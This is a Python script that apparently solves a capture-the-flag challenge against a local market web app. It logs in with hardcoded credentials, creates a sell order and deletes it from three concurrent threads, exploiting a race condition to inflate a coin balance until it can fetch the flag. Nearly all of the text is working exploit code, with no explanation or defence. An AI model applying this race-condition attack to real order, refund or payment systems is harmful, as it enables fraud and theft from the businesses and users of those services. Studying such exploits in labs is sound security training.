import time
import requests
from threading import Thread
from bs4 import BeautifulSoup


#
# after reached 100 coins go to /flag to get the flag


Base_url = "http://127.0.0.1:5005/"

Flag_URL = Base_url + "flag"
Login_URL = Base_url + "login"
New_order_URL = Base_url + "new_order"
Delete_order_URL = Base_url + "delete_order"
Market_URL = Base_url + "market"

header = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",

}

def attempLogin(username, password):
    param = {'username': username, 'password': password, 'log_user':''}
    s = requests.Session()
    login = s.post(url=Login_URL, data=param)

    if 'Welcome back!' in login.text:
        print("LOGIN DONE")
        return s
    else:
        print(login)

def createOrder(session, type):
    param = {'euro': 100, 'coins': 100, 'buy': type}
    res = session.post(url=New_order_URL, data=param)

def deleteOrder(session, order_id):
    session.get(url=Delete_order_URL+"/"+str(order_id))

def checkOrderId(session, user):
    res = session.get(url=Market_URL)
    if "Create a new Order" in res.text:
        soup = BeautifulSoup(res.text, 'html.parser')
        table = soup.find_all("tbody")[0]
        trs = table.find_all("tr")
        for tr in trs:
            if user in tr.text:
                td = tr.find_all("th")[0]
                return td.text
    return None


def checkCoins(session):
    res = session.get(url=Market_URL)
    if "Create a new Order" in res.text:
        soup = BeautifulSoup(res.text, 'html.parser')
        div_list = soup.find_all('div')
        if len(div_list) > 1:
            coin = div_list[1].contents[0].split(" ")[-1][:-2]
            return int(coin)
    return None

def getFlag(session):
    res = session.get(url=Flag_URL)
    if "flag{" in res.text:
        return res.text


if __name__ == "__main__": 
    s = attempLogin('peppetort01', 'peppetort01')

    for attemp in range(1000):
        print("Attemp n " + str(attemp+1))
        if checkCoins(s) > 1000:
            flag = getFlag(s)
            print("FLAG: " + str(flag))
            exit()
        

        createOrder(s, "sell")
        id = checkOrderId(s, "peppetort01")
        del_threads = list()
        for i in range(3):
            t = Thread(target=deleteOrder, args=(s, id))
            del_threads.append(t)

        for t in del_threads:
            t.start()

